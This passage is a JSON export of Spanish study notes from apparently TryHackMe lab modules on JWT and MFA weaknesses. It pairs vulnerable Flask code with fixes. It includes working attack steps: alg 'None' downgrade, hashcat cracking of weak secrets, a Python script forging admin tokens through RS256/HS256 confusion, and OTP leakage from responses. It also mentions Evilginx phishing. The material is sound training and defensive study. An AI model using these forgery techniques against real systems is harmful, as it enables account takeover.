    "content": "<h2>Divulgaci√≥n de Informaci√≥n Sensible</h2>\nEl primer problema com√∫n que veremos ser√° la exposici√≥n de informaci√≥n en el JWT.\n\nUn acercamiento de manejo de sesiones basado en cookies usa la sesi√≥n del lado del servidor para guardar m√∫ltiples par√°metros. En PHP, por ejemplo, puedes usar `$SESSION['var']=data` para guardar un valor asociado con la sesi√≥n de un usuario. Estos valores no se exponen del lado del cliente y por ello s√≥lo pueden ser recuperados del lado del servidor. Sin embargo, con los tokens, las afirmaciones son expuestas ya que el JWT entero se manda al lado del cliente. Algunos ejemplos ser√≠an:\n\n- Divulgaci√≥n de credenciales en hash, o pero, en texto claro si la contrase√±a se manda como afirmaci√≥n.\n- Exposici√≥n de informaci√≥n de la red interna como IP privada o hostname del servidor de autentificaci√≥n.\n\n<h4>Ejemplo pr√°ctico 1</h4>\nVamos a autentificarnos en nuestra API con la siguiente petici√≥n cURL:\n\n`curl -H 'Content-Type: application/json' -X POST -d '{ \"username\" : \"user\", \"password\" : \"password1\" }' http://10.80.190.89/api/v1.0/example1`\n\nEsto nos devuelve un JWT token.\n\n![[Pasted image 20251220151113.png]]\n\nUna vez lo tenemos, decodeamos el body del JWT para ver informaci√≥n sensible. Puedes hacerlo manualmente o usar [JWT.io](https://jwt.io/) para hacerlo.\n\n![[Pasted image 20251220152644.png]]\n\n<h6>El Error de Desarrollo</h6>\nEn el ejemplo, la informaci√≥n sensible fue a√±adida a las afirmaciones, como se muestra debajo.\n\n```python\npayload = {\n    \"username\" : username,\n    \"password\" : password,\n    \"admin\" : 0,\n    \"flag\" : \"[redacted]\"\n}\n\naccess_token = jwt.encode(payload, self.secret, algorithm=\"HS256\")\n```\n\n<h6>El Arreglo</h6>\nValores como la contrase√±a o la flag no deber√≠an ser a√±adidas a los claims (afirmaciones) ya que el JWT ser√° mandado al cliente. En su lugar, estos valores deber√≠an guardarse de forma segura en el backend del servidor. Al ser requeridos, el nombre de usuario puede ser le√≠do de un JWT verificado y usado para comprobar el valor de la flag/contrase√±a.\n\n```python\npayload = jwt.decode(token, self.secret, algorithms=\"HS256\")\n\nusername = payload['username']\nflag = self.db_lookup(username, \"flag\")\n```",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "0. JWT Security",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/0-jwt-security/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/0. JWT Security.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "[[1. Token-Based Authentication]]\n[[2. JSON Web Tokens]]\n[[3. Sensitive Information Disclosure]]\n[[4. Signature Validation Mistakes]]\n[[5. JWT Lifetimes]]\n[[6. Cross-Service Relay Attacks]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Cross-Service Relay Attacks",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/6-cross-service-relay-attacks/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/6. Cross-Service Relay Attacks.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "El √∫ltimo tipo de mala configuraci√≥n que veremos ser√° la cross-service. Los JWT se usan en sistemas centralizados. Sin embargo, puede que queramos restringir qu√© aplicaciones son accedidas con un JWT, especialmente cuando hay claims que deber√≠an ser validadas por ciertas aplicaciones. Esto puede hacerse usando el claim `audience`. Sin embargo, si no est√° reforzado correctamente, puede darse un ataque cross-service relay para realizar una escalada de privilegios.\n\n------------------------------------\n<h2>El Audience Claim</h2>\nLos JWTs pueden tener un claim `audience`. En los casos donde un s√≥lo sistema de autentificaci√≥n sirve m√∫ltiples aplicaciones, el claim de audience puede indicar para qu√© aplicaci√≥n est√° hecho un determinado JWT. Sin embargo, este refuerzo debe darse en la aplicaci√≥n en s√≠ misma, no en el servidor de autentificaci√≥n. Si este claim no se verifica, como el JWT sigue siendo percibido como v√°lido, puede tener consecuencias no intencionadas.\n\nUn ejemplo de esto es si un usuario tiene privilegios de administrador o un rol m√°s elevado en cierta aplicaci√≥n, el JWT guardado para el usuario tiene un claim que indica `\"admin\": true`. Sin embargo, ese mimo usuario no es admin en otra aplicaci√≥n servida por el mismo sistema de autentificaci√≥n. Si el claim audience no se verifica en la segunda aplicaci√≥n, el servidor tomar√° por error a dicho usuario como uno con privilegios elevados.\n\n<h4>Ejemplo Pr√°ctico 7</h4>\nPara este ejemplo, hay dos endpoints API llamados `example7_appA` y `example7_appB`. Puedes usar la misma petici√≥n `GET` que hiciste en el resto de ejemplos para recuperar la flag. Adem√°s, para la autentificaci√≥n tienes que incluir `\"application\": \"appX\"` en la petici√≥n de login.\n\n1. Nos autentificamos en `example7` usando el segmento `'{ \"username\" : \"user\", \"password\" : \"password7\", \"application\" : \"appA\"}'`.\n   ![[Pasted image 20251220221124.png]]\n2. Usamos este token en peticiones admin y user que haremos a `example7_appA` y `example7_appB`.\n   ![[Pasted image 20251220222028.png]]\n   Vemos que la app A lo acept√≥ pero no somos admin. Sin embargo, B ni siquiera lo acept√≥ porque la `audience` es err√≥nea.\n3. Nos autentificamos en `example7` usando el siguiente segmento ahora `'{ \"username\" : \"user\", \"password\" : \"password7\", \"application\" : \"appB\"}'`. Veremos que el claim audience es a√±adido y que ahora somos admin.\n   ![[Pasted image 20251220222507.png]]\n\n<h6>El Error de Despliegue</h6>\nEl problema clave es que el claim audiencia no ha sido verificado en appA. Esto puede ser porque la verificaci√≥n del claim audience ha sido apagada o que el scope de la audiencia es demasiado amplio.\n\n<h6>El Arreglo</h6>\nEl claim audience deber√≠a ser verificado cuando se decodifica el token. Esto puede hacerse como se muestra debajo.\n\n```python\npayload = jwt.decode(token, self.secret, audience=[\"appA\"], algorithms=\"HS256\")\n```",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "5. JWT Lifetimes",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/5-jwt-lifetimes/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/5. JWT Lifetimes.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "<h2>Tiempo de Vida de los Tokens</h2>\nAntes de verificar la firma del token, el tiempo de vida del token deber√≠a ser calculado para asegurar que el token no ha expirado. Esto normalmente se hace leyendo el claim `exp` (expiration time) del token y calculando si este sigue siendo v√°lido.\n\nUn problema com√∫n es si el valor `exp` es demasiado grande o no est√° configurado en absoluto. El token ser√≠a v√°lido para demasiado tiempo, o nunca expirar. Las cookies pueden ser expiradas del lado del cliente, sin embargo, los JWT no tienen la misma funcionalidad construida. Si queremos expirar un token antes del tiempo `exp`, debemos mantener una blacklist de estos tokens, rompiendo as√≠ el modelo centralizado. Es por esto que el foco deber√≠a estar en seleccionar el tiempo `exp` adecuado dada la funcionalidad de la aplicaci√≥n. Otra opci√≥n son los refresher tokens.\n\n<h4>Ejemplo Pr√°ctico 6</h4>\nEn este ejemplo, la implementaci√≥n JWT no especific√≥ un valor `exp` lo que implica que los tokens siempre sean v√°lidos. Usa el siguiente token para obtener la flag:\n`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU`\n\n![[Pasted image 20251220210553.png]]\n\n<h6>El Error de Desarrollo</h6>\nComo ya hemos mencionado, el JWT no tiene un valor `exp` por lo que siempre se mantiene vigente.\n\n<h6>El Arreglo</h6>\nUn valor `exp` deber√≠a ser a√±adido a los claims. Una vez a√±adido, la mayor√≠a de las librer√≠as incluir√°n revisar dicho valor en sus comprobaciones de validez. Esto puede ser hecho como se muestra aqu√≠ debajo:\n\n```python\nlifetime = datetime.datetime.now() + datetime.timedelta(minutes=5)\n\npayload = {\n    'username' : username,\n    'admin' : 0,\n    'exp' : lifetime\n}\n\naccess_token = jwt.encode(payload, self.secret, algorithm=\"HS256\")\n```",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "2. JSON Web Tokens",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/2-json-web-tokens/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/2. JSON Web Tokens.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "JWTs son tokens autocontenidos que pueden ser usados para transmitir informaci√≥n de sesi√≥n de forma segura. Es un est√°ndar abierto, ofreciendo informaci√≥n para cualquier desarrollador o creador de librer√≠as que quiera usarlos.\n\n------------------------------\n<h2>Estructura JWT</h2>\nUn JWT consta de 3 componentes cada uno encodeado en base64 y separado por puntos.\n\n- **Header:** El header normalmente indica el tipo de token, que es JWT, y el algoritmo usado para la firma.\n- **Payload:** El payload es el cuerpo del token que contiene las afirmaciones. Estas son piezas de informaci√≥n ofrecidas para una entidad espec√≠fica. En JWTs, hay afirmaciones registradas, las cuales son predefinidas por el est√°ndar JWT, y p√∫blicas o privadas, las cuales son definidas por el desarrollador.\n- **Signature:** La firma es la parte del token que ofrece un m√©todo para verificar la autenticidad de dicho token. La firma se crea usando un algoritmo especificado en el header.\n\n------------------------------------------\n<h2>Algoritmos de Firmado</h2>\nAunque hay varios algoritmos diferentes definidos en el est√°ndar JWT, s√≥lo nos importan 3:\n\n- **None:** El algoritmo None significa que no se utiliza ning√∫n algoritmo para la firma. De manera efectiva, es un JWT sin firma, significando que la verificaci√≥n de las afirmaciones no puede ser hecha a trav√©s de la firma.\n- **Symmetric Signing:** Un algoritmo de firmado sim√©trico, como HS256, crea la firma a√±adiendo un valor secreto al header y body del JWT antes de generar un valor hash. La verificaci√≥n del token puede ser realizada por cualquier sistema conocedor de dicho secreto.\n- **Asymmetric Signing:** Un algoritmo de firmado asim√©trico, como RS256, crea la firma usando una clave privada para firmar el header y cuerpo del JWT. Se crea generando el hash y luego encriptando el hash usando la clave privada. La verificaci√≥n la puede realizar cualquier sistema conocedor de la clave p√∫blica asociada a la clave privada utilizada para crear la firma.\n\n-----------------------------------\n<h2>Seguridad en la Firma</h2>\nLos JWT pueden ser encriptados (llamados JWEs), pero la fuerza principal de los JWTs viene de la firma. Una vez que se firma el JWT,  puede mandarse al cliente, quien puede usarlo cuando lo necesite. Podemos tener un servidor de autentificaci√≥n centralizado que cree los JWTs usados en varias aplicaciones. Cada aplicaci√≥n puede verificas la firma.",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "1. Token-Based Authentication",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/1-token-based-authentication/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/1. Token-Based Authentication.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "<h2>El Auge de las APIs</h2>\nLas Application Programming Interfaces, o APIs para acortar, se han vuelto extremadamente populares. Una de las razones clave para este \"boom\" es la habilidad de crear una API que pueda servir varias interfaces diferentes , como una aplicaci√≥n web y de m√≥vil al mismo tiempo, lo que permite reutilizar la l√≥gica del servidor y centralizarla.\n\nSin embargo, los nuevos m√©todos de manejo de sesi√≥n tambi√©n se crearon con el auge de las APIs. Debido a que las cookies est√°n asociadas con las aplicaciones usadas en navegadores (web), estas no suelen funcionar bien para otras interfaces. Aqu√≠ es donde el manejo de sesiones basada en tokens entra en juego.\n\n----------------------------------------\n<h2>Manejo de Sesiones basada en Tokens</h2>\nEl manejo de sesiones basada en tokens es un concepto relativamente nuevo. En lugar de usar las cookies autom√°ticas generadas por el navegador, conf√≠a en el c√≥digo del lado del cliente para este proceso. Despu√©s de la autentificaci√≥n la aplicaci√≥n ofrece un token en el body de la petici√≥n. Usando JavaScript del lado del cliente, este token se guarda en el almacenamiento local del navegador.\n\nCuando se hace una nueva petici√≥n, el c√≥digo JavaScript debe cargar el token del almacenamiento en la cabecera. Uno de los tokens m√°s comunes es JSON Web Tokens (JWT), que se pasan mediante el header `Authorization: Bearer`. \n\n-------------------------------------\n<h2>Proyecto API</h2>\nDurante esta unidad realizaremos explotaci√≥n contra varias APIs. Las APIs pueden ser documentadas usando diversos m√©todos. Un m√©todo popular es crear un proyecto [Postman](https://www.postman.com/) o un archivo [Swagger](https://swagger.io/). La API fue desarrollada en Python Flask, por lo que los ejemplos de c√≥digo estar√°n en Python.\n\n---------------------------------------\n<h2>Endpoints API</h2>\nEl proyecto API tiene un s√≥lo endpoint, llamado `<IP>/api/v1.0/exampleX`. donde `X` es sustituida por el n√∫mero del ejemplo. Este endpoint accede a dos m√©todos HTTP:\n\n- **POST:** Para autentificar y recibir tu JWT, necesitas hacer una petici√≥n POST con las credenciales en formato JSON.\n- **GET:** Para conseguir los detalles sobre tu usuario y realizar la escalada de privilegios para conseguir la flag.\n\n------------------------------------------\n<h2>Credenciales API</h2>\nPara autentificar la API, necesitas mandar un body JSON con credenciales:\n\n- **Username:** user\n- **Password:** passwordX\n\nLa `X` necesita ser reemplazada con el n√∫mero del ejemplo.\n\n-------------------------------\n<h2>Ejemplos de Peticiones</h2>\nAqu√≠ debajo tienes ejemplos de peticiones cURL que puedes realizar a la API.\n\nPara autentificarte puedes mandar:\n\n`curl -H 'Content-Type: application/json' -X POST -d '{ \"username\" : \"user\", \"password\" : \"passwordX\" }' http://10.80.190.89/api/v1.0/exampleX`\n\nPara la verificaci√≥n del usuario puedes mandar:\n\n`curl -H 'Authorization: Bearer [JWT token]' http://10.80.190.89/api/v1.0/example2?username=Y`\n\nEl componente `[JWT token]` debe ser reemplazado por el JWT recibido de la primera petici√≥n. En este caso `Y` puede ser `user` o `admin`.\n\n---------------------------------------------\n<h2>Permisos API</h2>\nEl objetivo principal en cada ejemplo es ganar privilegios de administrador y verificar dichos permisos. Una vez que tengas un JWT v√°lido donde `admin=1`, puedes hacer una petici√≥n para ver los detalles del usuario `admin`, consiguiendo as√≠ la flag.",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "4. Signature Validation Mistakes",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/4-signature-validation-mistakes/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/4. Signature Validation Mistakes.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
    "content": "El segundo error com√∫n con los JWTs es no verificar correctamente la firma. Si la firma no se verifica correctamente, un atacante puede falsificar un token JWT para ganar acceso a la cuenta del usuario.\n\n----------------------------------------\n<h2>No Verificar la Firma</h2>\nEl primer problema con la validaci√≥n de la firma es cuando no hay validaci√≥n de la firma. Si el servidor no verifica la firma del JWT, entonces es posible modificar los claims en el JWT a lo que prefieras que sean.\n\n<h4>Ejemplo Pr√°ctico 2</h4>\nNos autentificaremos en la API con:\n\n`curl -H 'Content-Type: application/json' -X POST -d '{ \"username\" : \"user\", \"password\" : \"password2\" }' http://10.80.190.89/api/v1.0/example2`\n\nUna vez autentificados, podemos ver nuestro usuario con:\n\n`curl -H 'Authorization: Bearer [JWT Token]' http://10.80.190.89/api/v1.0/example2?username=user`\n\n![[Pasted image 20251220155740.png]]\n\nSin embargo, vamos a tratar de autentificarnos sin firma para conseguir ser el usuario que queramos. Para ello, tenemos que modificar la claim de admin y el usuario, tanto del body como de la URL.\n\n![[Pasted image 20251220160034.png]]\n\n<h6>El Error de Desarrollo</h4>\nEn el ejemplo, la firma no se comprueba, como podemos ver debajo:\n\n```python\npayload = jwt.decode(token, options={'verify_signature': False})\n```\n\n>[!IMPORTANT] Aunque esto es bastante raro en APIs normales, suele ocurrir en las APIs \"server-to-server\". \n\n<h6>El Arreglo</h6>\nEl JWT siempre deber√≠a ser validado o deber√≠an usarse factores de autentificaci√≥n adicionales, como certificados para la comunicaci√≥n entre servidores. El JWT puede verificarse dando el secreto (o clave p√∫blica) como se muestra debajo.\n\n```python\npayload = jwt.decode(token, self.secret, algorithms=\"HS256\")\n```\n\n-----------------------------------\n<h2>Downgrade a None</h2>\nOtro problema es el downgrade del algoritmo de firmado. JWT soporta el algoritmo de firmado `None`, que significa que no se usa firma. Aunque parece una idea \"tonta\", la idea era para la comunicaci√≥n servidor a servidor, donde la firma del token ya se comprobaba en el proceso de escalado. Si los desarrolladores no requieren verificar el algoritmo, o al menos denegar el algoritmo `None`, puedes cambiar el tipo de algoritmo especificado en el header del JWT, lo que causar√≠a que la librer√≠a usada para la verificaci√≥n siempre devolviera true, permitiendo as√≠ falsificar claims del token.\n\n<h4>Ejemplo Pr√°ctico 3</h4>\nAutentif√≠cate en la API para recibir tu token JWT y verificar tu usuario. Para realizar este ataque, necesitar√° alterar manualmente el claim `alg` a `None`. Puedes usar [CyberChef](https://gchq.github.io/CyberChef/)  para dicho prop√≥sito. Que no se te olvide poner el punto al final.\n\n![[Pasted image 20251220172813.png]]\n\n<h6>El Error de Desarrollo</h6>\nAunque parece el mismo problema que antes, desde el punto de vista de desarrollo, es m√°s complejo. A veces, los desarrolladores quieren asegurarse de que su implementaci√≥n admite varios algoritmos de verificaci√≥n de firmas. La implementaci√≥n se leer√≠a entonces, normalmente, el header del JWT y parsea el algoritmo encontrado en la verificaci√≥n del componente.\n\n```python\nheader = jwt.get_unverified_header(token)\n\nsignature_algorithm = header['alg']\n\npayload = jwt.decode(token, self.secret, algorithms=signature_algorithm)\n```\n\nEl problema es obvio, si ponemos `None` entonces este se convierte en el algoritmo, con los consecuentes problemas. La librer√≠a [Pyjwt](https://pyjwt.readthedocs.io/en/stable/), tiene implementado c√≥digo seguro para prevenir dicho problema.\n\n<h6>El Arreglo</h6>\nSi se deben soportar m√∫ltiples algoritmos, estos deber√≠an ser declarados en el c√≥digo como un array.\n\n```python\npayload = jwt.decode(token, self.secret, algorithms=[\"HS256\", \"HS384\", \"HS512\"])\n\nusername = payload['username']\nflag = self.db_lookup(username, \"flag\")\n```\n\n------------------------------------\n<h2>Secretos Sim√©tricos D√©biles</h2>\nSi se usa un algoritmo de firmado sim√©trico, la seguridad del JWT recae en la fortaleza y la entrop√≠a del secreto usado. Si se usa un secreto d√©bil, puede ser posible realizar crackeo offline para recuperar el secreto. Una vez el valor secreto se conoce, puedes ganar acceso alterando las claims y recalculando una firma v√°lida.\n\n<h4>Ejemplo Pr√°ctico 4</h4>\nPara este ejemplo, un secreto d√©bil fue usado para generar el JWT. Una vez obtengas el JWT, tienes varias opciones para romper el secreto. Por ejemplo, puedes usar `hashcat` o `john`.\n\n1. Guarda el JWT en un archivo llamado `jwt.txt`.\n   ![[Pasted image 20251220181345.png]]\n2. Descarga una lista de secretos JWT comunes, vamos a usar `wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list`.\n   ![[Pasted image 20251220181524.png]]\n3. Usamos hashcat para crackear el secret.\n   ![[Pasted image 20251220182248.png]]\n4. Ahora construimos el JWT y conseguimos la flag.\n   ![[Pasted image 20251220185838.png]]\n\n<h6>El Error de Desarrollo</h6>\nEl problema ocurre debido a que el secreto JWT usado es muy d√©bil. Esto puede ocurrir si los desarrolladores tienen prisa o copian c√≥digo de ejemplos.\n\n<h6>El Arreglo</h6>\nUn secreto seguro debe ser utilizado. Este valor ser√° usado en el software y no por humanos, por lo que una string larga y aleatoria deber√≠a valer.\n\n---------------------------------------------\n<h2>Confusi√≥n del Algoritmo de Firmado</h2>\nEl √∫ltimo problema com√∫n con la validaci√≥n de la firma es cuando se puede realizar un ataque de confusi√≥n de algoritmo. Es similar al ataque de downgrade `None`. Sin embargo, pasa espec√≠ficamente con la confusi√≥n entre algoritmos de firmado sim√©tricos y asim√©tricos. Si se usa un algoritmo asim√©trico como RS356, puede ser posible hacer un downgrade del algoritmos a HS256. En estos casos, alguna librer√≠as vuelven por defecto a usar la clave p√∫blica como clave sim√©trica. Como esta es conocida, puedes falsificar el JWT.\n\n<h4>Ejemplo Pr√°ctico 5</h4>\nEs similar al ejemplo 3. Excepto por que esta vez el algoritmo `None` no est√° permitido. Sin embargo, una vez que te autentifiques, tambi√©n recibir√°s la clave p√∫blica. Como la clave p√∫blica no se reconoce como informaci√≥n sensible es com√∫n que la puedas encontrar. A veces incluso est√° incrustada como claim en el JWT. En este ejemplo debes downgradear el algoritmo a HS256 y usar la clave p√∫blica para falsificar un token.\n\n```python\nimport base64 \nimport hmac \nimport hashlib \nimport json \n\ndef b64url(data): \n\treturn base64.urlsafe_b64encode(data).decode('utf-8').replace('=', '') \n\n# 1. Datos \npublic_key = \"clave_p√∫blica\" \nheader = {\"typ\": \"JWT\", \"alg\": \"HS256\"} \npayload = {\"username\": \"admin\", \"admin\": 1} \n\n# 2. Codificar Header y Payload \njson_header = json.dumps(header, separators=(',', ':')).encode() \njson_payload = json.dumps(payload, separators=(',', ':')).encode() \ndata_to_sign = b64url(json_header) + \".\" + b64url(json_payload) \n\n# 3. Firmar usando la clave p√∫blica como secreto HMAC-SHA256 \nsignature = hmac.new( \n\tpublic_key.encode('utf-8'), \n\tdata_to_sign.encode('utf-8'), \n\thashlib.sha256 \n).digest() \n\n# 4. Token final \nprint(data_to_sign + \".\" + b64url(signature))\n```\n\nPuedes usar este c√≥digo.\n\n1. Obtenemos el token y la clave p√∫blica.\n   ![[Pasted image 20251220192434.png]]\n2. Usamos el script de arriba para generar el token.\n   ![[Pasted image 20251220192510.png]]\n3. Obtenemos la flag.\n   ![[Pasted image 20251220192530.png]]\n\n<h6>El Error de Desarrollo</h6>\nEl error en este ejemplo es similar al del ejemplo 3 pero un poco m√°s complejo. Aunque el algoritmo `None` est√° deshabilitado, el problema principal surge de que se permitan tanto los algoritmos sim√©tricos como los asim√©tricos.\n\n```python\npayload = jwt.decode(token, self.secret, algorithms=[\"HS256\", \"HS384\", \"HS512\", \"RS256\", \"RS384\", \"RS512\"])\n```\n\nHay que tener cuidado especial para no permitir mezclar tipos de algoritmos.\n\n<h6>El Arreglo</h6>\nAunque permitamos ambos algoritmos de firmado, se requiere un poco m√°s de l√≥gica para asegurar que no hay confusi√≥n, como se muestra en el ejemplo de abajo.\n\n```python\nheader = jwt.get_unverified_header(token)\n\nalgorithm = header['alg']\npayload = \"\"\n\nif \"RS\" in algorithm:\n    payload = jwt.decode(token, self.public_key, algorithms=[\"RS256\", \"RS384\", \"RS512\"])\nelif \"HS\" in algorithm:\n    payload = jwt.decode(token, self.secret, algorithms=[\"HS256\", \"HS384\", \"HS512\"])\n\nusername = payload['username']\nflag = self.db_lookup(username, \"flag\")\n```",
    "modified": "2025-12-21T00:57:18"
  },
  {
    "title": "0. Multi-Factor Authentication",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/0-multi-factor-authentication/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/0. Multi-Factor Authentication.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "[[1. How MFA Works]]\n[[2. Implementations and Applications]]\n[[3. Common Vulnerabilities in MFA]]\n[[4. Practical - OTP Leakage]]\n[[5. Practical - Insecure Coding]]\n[[6. Practical Beating the Auto-Logout Feature]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Practical - OTP Leakage",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/4-practical-otp-leakage/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/4. Practical - OTP Leakage.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "<h2>Filtraci√≥n OTP</h2>\nLa filtraci√≥n OTP en la respuesta XHR (XMLHttpRequest), t√≠picamente ocurre debido a la implementaci√≥n pobre de 2FA o programaci√≥n insegura. Algunas razones comunes por lo que esto ocurre son:\n\n<h4>Validaci√≥n del Lado del Servidor y Devoluci√≥n de Informaci√≥n Sensible</h4>\nEn algunas aplicaciones dise√±adas pobremente, el servidor valida el OTP y m√°s que s√≥lo confirmar el √©xito o fracaso, devuelve el OTP en la respuesta. Esto es com√∫nmente hecho no intencionalmente, como parte del debugging, registro o pr√°cticas pobres de manejo de respuestas.\n<h4>Falta de Pr√°cticas de Seguridad Adecuadas</h4>\nLos desarrolladores pueden pasar por alto las implicaciones de seguridad de exponer informaci√≥n sensible como los OTP en las respuestas API. Esto suele pasar cuando los desarrolladores est√°n concentrados en hacer la aplicaci√≥n funcional sin considerar c√≥mo los atacantes podr√≠an explotar estas respuestas.\n<h4>Informaci√≥n de Depuraci√≥n Dejada en Producci√≥n</h4>\nDurante el desarrollo o la fase de pruebas, los desarrolladores pueden incluir depuraci√≥n detallada en las respuestas para ayudar a diagnosticar errores. Si estas no se eliminan en producci√≥n, pueden revelar informaci√≥n sensible para los atacantes.\n\n------------------------------------------------------\n<h2>Explotaci√≥n</h2>\nVamos a http://mfa.thm/labs/first.\n\n![[Pasted image 20251225204437.png]]\n\nVamos a las herramientas del desarrollador y a \"Network\" e iniciamos sesi√≥n en la aplicaci√≥n usando:\n\n- **Username:** `thm@mail.thm`\n- **Password:** `test123`\n\n![[Pasted image 20251225205724.png]]\n\nUna vez introducidas las credenciales, podemos observar que hay una respuesta llamada token de 16B.\n\n![[Pasted image 20251225205920.png]]\n\nSi navegamos hasta el apartado de \"Response\" dentro de la petici√≥n XHR, podemos ver el valor del token.\n\n![[Pasted image 20251225210013.png]]\n\nCogemos el token y lo introducimos como OTP.\n\n![[Pasted image 20251225210107.png]]\n\nY efectivamente as√≠ entramos.\n\n![[Pasted image 20251225210127.png]]",
    "modified": "2025-12-26T00:53:51"
  },
  {
    "title": "3. Common Vulnerabilities in MFA",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/3-common-vulnerabilities-in-mfa/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/3. Common Vulnerabilities in MFA.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
    "content": "<h2>Algoritmos de Generaci√≥n de OTPs D√©biles</h2>\nLa seguridad de una OTP (One-Time Password) s√≥lo es tan fuerte como el algoritmo usado para crearla. Si el algoritmo es d√©bil o predecible, puede hacer que el trabajo del atacante sea m√°s sencillo. Si un algoritmo no usa valores verdaderamente aleatorios, el OTP generado puede seguir un patr√≥n haci√©ndolo predecible.\n\n---------------------------------------\n<h2>Filtraci√≥n del Token 2FA por la Aplicaci√≥n </h2>\nSi una aplicaci√≥n maneja la informaci√≥n pobremente o tiene vulnerabilidades como endpoints API inseguros, puede filtrar accidentalmente el token 2FA en la respuesta HTTP de la aplicaci√≥n.\n\nDebido a la programaci√≥n insegura, algunas aplicaciones pueden filtrar el token 2FA en la respuesta. Un escenario com√∫n es cuando un usuario llega a la p√°gina 2FA y la aplicaci√≥n dispara una petici√≥n XHR a un endpoint que emite el OTP. A veces, esta petici√≥n devuelve el OTP al usuario dentro de la respuesta HTTP.\n\n----------------------------------------\n<h2>BruteForceando el OTP</h2>\nAunque los OTPs se dise√±an para un s√≥lo uso, no son inmunes a los ataques de fuerza bruta. Si un atacante puede adivinar ilimitadamente, eventualmente obtendr√°n el OTP correcto.\n<h4>Falta de Limitaci√≥n de Frecuencia</h4>\nSi una limitaci√≥n de frecuencia adecuada, una aplicaci√≥n queda abierta a que un atacante siga intentando diferentes OTPs. Si el atacante pude subir varias peticiones en un corto periodo de tiempo, aumenta la posibilidad de que el atacante sea capaz de obtener el OTP correcto.\n\n---------------------------------------\n<h2>Uso de Evilginx</h2>\n[Evilginx](https://github.com/kgretzky/evilginx2) es una herramienta usada t√≠picamente en engagements de red team ya que puede ser usada para ejecutar ataques de phishing sofisticados, bypasseando el MFA de forma efectiva. Opera como un proxy MITM que puede interceptar y redirigir OTPs intencionados para usuarios leg√≠timos originalmente.\n\n![[Pasted image 20251225193547.png]]\n\nEvilginx funciona capturando usuario contrase√±a y OTP antes de redirigirlos al sitio real, de tal manera que le da a los atacantes acceso usando tus cookies sin necesidad de romper la MFA.",
    "modified": "2025-12-26T00:53:51"
  },
  {
    "title": "5. Practical - Insecure Coding",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/5-multi-factor-authentication/5-practical-insecure-coding/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/5. Multi-Factor Authentication/5. Practical - Insecure Coding.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 5. Multi-Factor Authentication",
